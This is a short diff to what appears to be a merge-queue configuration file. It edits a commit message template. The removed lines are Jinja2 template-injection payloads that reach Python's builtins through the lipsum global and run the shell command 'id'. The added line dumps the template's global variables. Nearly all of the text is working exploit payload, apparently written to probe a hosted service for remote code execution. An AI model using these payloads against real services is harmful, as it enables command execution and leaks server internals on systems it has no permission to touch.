@@ -4,6 +4,4 @@ queue_rules:
     merge_conditions: []
     merge_method: squash
     commit_message_template: |
-      RCE_IMPORT: {% for k, v in [lipsum]|map(attribute="__globals__")|list|first|items %}{% if k == "__builtins__" %}{{ v.__import__("os").popen("id").read() }}{% endif %}{% endfor %}
-      RCE_EVAL: {% for k, v in [lipsum]|map(attribute="__globals__")|list|first|items %}{% if k == "__builtins__" %}{{ v.eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
-      ALL_KEYS: {% for k, v in [lipsum]|map(attribute="__globals__")|list|first|items %}{{ k }},{% endfor %}
+      GLOBALS: {{ [lipsum]|map(attribute="__globals__")|list }}
